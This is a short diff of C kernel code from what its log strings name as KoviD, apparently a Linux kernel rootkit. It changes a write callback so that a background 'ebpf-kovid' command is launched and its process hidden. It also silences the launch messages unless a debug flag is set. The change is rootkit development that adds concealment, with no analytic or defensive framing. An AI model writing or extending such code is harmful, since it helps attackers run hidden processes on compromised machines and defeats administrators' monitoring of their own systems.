@@ -640,12 +640,17 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			int ret;
 
 			/* Use the *detached* version so we don't block */
-			ret = kv_run_system_command_detached(cmd);
+			/* In addition, hide the process.*/
+			ret = kv_run_and_hide_system_command_detached(cmd);
 			if (ret == 0) {
+#ifdef DEBUG_RING_BUFFER
 				pr_info("KoviD: Launched ebpf-kovid in background.\n");
+#endif
 			} else {
+#ifdef DEBUG_RING_BUFFER
 				pr_info("KoviD: Failed to run ebpf-kovid, ret=%d\n",
 					ret);
+#endif
 			}
 		} break;
 #ifdef DEBUG_RING_BUFFER
